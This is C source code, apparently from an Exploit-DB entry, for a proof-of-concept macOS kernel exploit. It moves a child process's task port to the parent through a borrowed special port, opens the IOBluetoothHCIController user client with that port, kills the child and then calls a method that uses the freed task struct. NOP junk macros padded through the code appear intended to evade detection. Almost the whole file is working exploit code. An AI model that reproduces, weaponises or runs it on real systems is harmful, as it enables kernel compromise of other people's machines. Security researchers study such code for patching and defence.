// https://www.exploit-db.com/exploits/40652

// build : clang -o exploit.cpp exploit.cpp -framework IOKit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/stat.h>

#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>

#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#define JUNK __asm__ __volatile__ ("PUSH %rax; NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP; POP %rax");

#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) { JUNK;   \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE); JUNK;        \
  }                             \
} while(0)

#define FAIL(str) do {JUNK; \
  printf("[-] " str "\n");JUNK;  \
  exit(EXIT_FAILURE); JUNK; \
} while (0)

#define LOG(str) do { JUNK;\
  printf("[+] " str"\n");JUNK; \
} while (0)

/***************
 * port dancer *
 ***************/

// set up a shared mach port pair from a child process back to its parent without using launchd
// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html

// mach message for sending a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

// mach message for receiving a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} port_msg_rcv_t;

typedef struct {
  mach_msg_header_t  header;
} simple_msg_send_t;

typedef struct {
  mach_msg_header_t  header;
  mach_msg_trailer_t trailer;
} simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT

// a copy in the parent of the stolen special port such that it can be restored
mach_port_t saved_special_port = MACH_PORT_NULL;

// the shared port right in the parent
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port() {JUNK;
  kern_return_t err;JUNK;
  // get a send right to the port we're going to overwrite so that we can both
  // restore it for ourselves and send it to our child
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("saving original special port value", err);JUNK;
JUNK;
  // allocate the shared port we want our child to have a send right to
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &shared_port_parent);
JUNK;
  MACH_ERR("allocating shared port", err);JUNK;
JUNK;
  // insert the send right
  err = mach_port_insert_right(mach_task_self(),
                               shared_port_parent,
                               shared_port_parent,
                               MACH_MSG_TYPE_MAKE_SEND);JUNK;
  MACH_ERR("inserting MAKE_SEND into shared port", err);
JUNK;
  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("setting special port", err);JUNK;
}

mach_port_t recover_shared_port_child() {
  kern_return_t err;JUNK;

  // grab the shared port which our parent stashed somewhere in the special ports
  mach_port_t shared_port_child = MACH_PORT_NULL;JUNK;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
  MACH_ERR("child getting stashed port", err);JUNK;

  LOG("child got stashed port");
JUNK;
  // say hello to our parent and send a reply port so it can send us back the special port to restore

  // allocate a reply port
  mach_port_t reply_port;JUNK;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);JUNK;
  MACH_ERR("child allocating reply port", err);
JUNK;
  // send the reply port in a hello message
  simple_msg_send_t msg = {0};
JUNK;
  msg.header.msgh_size = sizeof(msg);JUNK;
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port_child;JUNK;

  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
JUNK;
  err = mach_msg_send(&msg.header);JUNK;
  MACH_ERR("child sending task port message", err);JUNK;
JUNK;
  LOG("child sent hello message to parent over shared port");JUNK;

  // wait for a message on the reply port containing the stolen port to restore
  port_msg_rcv_t stolen_port_msg = {0};JUNK;
  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving stolen port\n", err);JUNK;
JUNK;
  // extract the port right from the message
  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;JUNK;
  if (stolen_port_to_restore == MACH_PORT_NULL) {
    FAIL("child received invalid stolen port to restore");JUNK;
  }
JUNK;
  // restore the special port for the child
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
  MACH_ERR("child restoring special port", err);JUNK;
JUNK;
  LOG("child restored stolen port");JUNK;
  return shared_port_child;
}

mach_port_t recover_shared_port_parent() {JUNK;
  kern_return_t err;
JUNK;
  // restore the special port for ourselves
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("parent restoring special port", err);JUNK;
JUNK;
  // wait for a message from the child on the shared port
  simple_msg_rcv_t msg = {0};JUNK;
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port_parent,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child hello message", err);
JUNK;
  LOG("parent received hello message from child");
JUNK;
  // send the special port to our child over the hello message's reply port
  port_msg_send_t special_port_msg = {0};
JUNK;
  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;JUNK;
  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;JUNK;
  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
  special_port_msg.body.msgh_descriptor_count = 1;
JUNK;
  special_port_msg.port.name        = saved_special_port;
  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;JUNK;
  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;
JUNK;
  err = mach_msg_send(&special_port_msg.header);JUNK;
  MACH_ERR("parent sending special port back to child", err);
JUNK;
  return shared_port_parent;
}

/*** end of port dancer code ***/

void do_child(mach_port_t shared_port) {
  kern_return_t err;
JUNK;
  // create a reply port to receive an ack that we should exec the target
  mach_port_t reply_port;JUNK;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);JUNK;

  // send our task port to our parent over the shared port
  port_msg_send_t msg = {0};
JUNK;
  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;JUNK;
  msg.header.msgh_remote_port = shared_port;JUNK;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
JUNK;
  msg.body.msgh_descriptor_count = 1;
JUNK;
  msg.port.name = mach_task_self();JUNK;
  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;JUNK;
  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;
JUNK;
  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);JUNK;
JUNK;
  LOG("child sent task port back to parent");
JUNK;
  // spin and let our parent kill us
  while(1){;}
}

mach_port_t do_parent(mach_port_t shared_port) {
  kern_return_t err;
JUNK;
  // wait for our child to send us its task port
  port_msg_rcv_t msg = {0};JUNK;
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child task port message", err);
JUNK;
  mach_port_t child_task_port = msg.port.name;
  if (child_task_port == MACH_PORT_NULL) {
    FAIL("invalid child task port");JUNK;
  }

  LOG("parent received child's task port");
JUNK;
  return child_task_port;
}

io_connect_t get_connection(mach_port_t task_port) {
  kern_return_t err;
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
JUNK;
  if (service == MACH_PORT_NULL) {
    printf("unable to get service\n");
    return MACH_PORT_NULL;
  }
JUNK;
  io_connect_t conn = MACH_PORT_NULL;
JUNK;
  err = IOServiceOpen(service, task_port, 0, &conn);JUNK; // 1 = IOBluetoothHCIUserClient
  if (err != KERN_SUCCESS){
    printf("IOServiceOpen failed: %s\n", mach_error_string(err));
    conn = MACH_PORT_NULL;
  }
  IOObjectRelease(service);
JUNK;
  return conn;   
}

void trigger(int child_pid, mach_port_t child_task_port) {
  kern_return_t err;
  // get the userclient passing the child's task port
  io_connect_t conn = get_connection(child_task_port);JUNK;
  if (conn == MACH_PORT_NULL){JUNK;
    printf("unable to get connection\n");
    return;
  }
JUNK;
  printf("got user client\n");
JUNK;
  // drop our ref on the child_task_port
  mach_port_deallocate(mach_task_self(), child_task_port);
JUNK;
  // kill the child, free'ing its task struct
  kill(child_pid, 9);
  int status;
  wait(&status);
JUNK;
  printf("killed child\n");
JUNK;
  // make an external method call which will use that free'd task struct
  char struct_input[0x74] = {0};JUNK;
JUNK;
  //+0x70 dword = index into sroutines
  //+0x38 dword = size of first argument
  //+0x0 qword = pointer to first argument
  struct_input[0x38] = 0x80;
  *(uint64_t*)(&struct_input[0]) = 0x414141414141;JUNK;
JUNK;
  err = IOConnectCallMethod(conn,
                            0,
                            NULL,
                            0,
                            struct_input,
                            0x74,
                            NULL,
                            NULL,
                            NULL,
                            NULL);
  MACH_ERR("making external method call", err);JUNK;
  JUNK;
}

int main(int argc, char** argv) {
  setup_shared_port();
JUNK;
  pid_t child_pid = fork();
  if (child_pid == -1) {JUNK;
    FAIL("forking");
  }

  if (child_pid == 0) {JUNK;
    mach_port_t shared_port_child = recover_shared_port_child();
    do_child(shared_port_child);
  } else {JUNK;
    mach_port_t shared_port_parent = recover_shared_port_parent();JUNK;
    mach_port_t child_task_port = do_parent(shared_port_parent);JUNK;
    trigger(child_pid, child_task_port);JUNK;
  }

  return 0;
}